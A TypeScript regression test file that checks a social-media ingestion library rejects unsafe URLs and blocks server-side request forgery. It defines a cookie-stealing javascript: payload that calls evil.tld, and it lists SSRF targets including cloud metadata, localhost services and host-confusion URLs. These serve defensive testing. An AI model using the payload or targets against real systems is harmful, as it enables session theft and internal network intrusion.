/**
 * Regression tests for the two vulnerabilities found in the 2026-08-27 review.
 *
 *   npm run verify:urls
 *
 * Both were introduced by the web-preview ingestion path in PR #3 and both are
 * silent: nothing throws, no status code changes, and every layer behaves
 * exactly as written. Only these assertions catch a regression.
 */

import { getPostUrl, getParentSource } from '@/lib/urls';
import { safeHttpUrl } from '@/lib/ingestion/types';
import { instagramConnector } from '@/lib/ingestion/instagram';
import { SocialPost } from '@/types/intelligence';

let passed = 0;
let failed = 0;

function check(name: string, condition: boolean, detail = '') {
  if (condition) {
    passed++;
    console.log(`  PASS  ${name}`);
  } else {
    failed++;
    console.log(`  FAIL  ${name}${detail ? ` — ${detail}` : ''}`);
  }
}

function post(over: Partial<SocialPost>): Partial<SocialPost> {
  return { id: 'ig_abc', platform: 'instagram', ...over };
}

console.log('\n── XSS: no javascript: URL may escape into an href ──\n');

// The exact payload from the review: og:url scraped from an attacker page.
const XSS = "javascript:fetch('//evil.tld/?c='+document.cookie)";

check(
  'getPostUrl rejects javascript: on the instagram branch',
  getPostUrl(post({ url: XSS })) !== XSS,
  `returned ${JSON.stringify(getPostUrl(post({ url: XSS })))}`
);

check(
  'getPostUrl falls back to a safe instagram origin',
  getPostUrl(post({ url: XSS })) === 'https://www.instagram.com/'
);

check(
  'getParentSource rejects javascript: on the ig_ parent branch',
  getParentSource(post({ url: XSS, inReplyToPostId: 'ig_parent' }))?.url !== XSS
);

// This path fires for ANY platform whose parent id has no known prefix -- it
// was never instagram-specific, which is why patching one branch was not enough.
check(
  'getParentSource rejects javascript: on the generic parent branch',
  getParentSource({ id: 'x_1', platform: 'x', url: XSS, inReplyToPostId: 'unknown_1' })?.url === null
);

check(
  'data: URLs are rejected too',
  getPostUrl(post({ url: 'data:text/html,<script>alert(1)</script>' })) === 'https://www.instagram.com/'
);

// `startsWith('http')` was the original check and is not sufficient.
check(
  'httpfoo: does not pass as http',
  getPostUrl(post({ url: 'httpfoo://evil.tld' })) === 'https://www.instagram.com/'
);

check(
  'genuine https URLs still pass through untouched',
  getPostUrl(post({ url: 'https://www.instagram.com/reel/abc/' })) ===
    'https://www.instagram.com/reel/abc/'
);

check(
  'genuine http URLs still pass through untouched',
  getPostUrl(post({ url: 'http://example.com/x' })) === 'http://example.com/x'
);

check(
  'id-derived youtube links are unaffected',
  getPostUrl({ id: 'yt_video_ABC', platform: 'youtube' }) ===
    'https://www.youtube.com/watch?v=ABC'
);

console.log('\n── safeHttpUrl (shared connector helper) ──\n');

check('safeHttpUrl rejects javascript:', safeHttpUrl(XSS) === null);
check('safeHttpUrl rejects a non-URL', safeHttpUrl('not a url') === null);
check('safeHttpUrl rejects undefined', safeHttpUrl(undefined) === null);
check('safeHttpUrl accepts https', safeHttpUrl('https://a.test/x') === 'https://a.test/x');

console.log('\n── SSRF: the web preview must only ever reach instagram.com ──\n');

/**
 * Each of these previously produced a real server-side fetch. The connector now
 * declines them before any network call, falling through to the Graph API
 * branch -- which, with no credentials configured in this test process, reports
 * missing-credentials. Any status of 'ok' here means the SSRF is back.
 */
const SSRF_TARGETS = [
  'http://169.254.169.254/latest/meta-data/',   // cloud metadata
  'http://127.0.0.1:8000/health',               // the co-located ML service
  'http://localhost:27017/',                    // mongo
  'http://10.0.0.1/admin',                      // private range
  'https://evil.tld/reel/x',                    // attacker host, https
  'https://evil.tld/?instagram.com/',           // beats the old substring test
  'http://instagram.com.evil.tld/reel/x',       // suffix-confusion host
];

async function main() {
  for (const target of SSRF_TARGETS) {
    const result = await instagramConnector.fetch(target, 1);
    check(
      `refuses ${target}`,
      result.status !== 'ok' && result.posts.length === 0,
      `status=${result.status} posts=${result.posts.length}`
    );
  }

  console.log('\n══════════════════════════════════════════════════');
  console.log(`URL / SSRF safety: ${passed} passed, ${failed} failed`);
  console.log('══════════════════════════════════════════════════\n');

  if (failed > 0) process.exit(1);
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
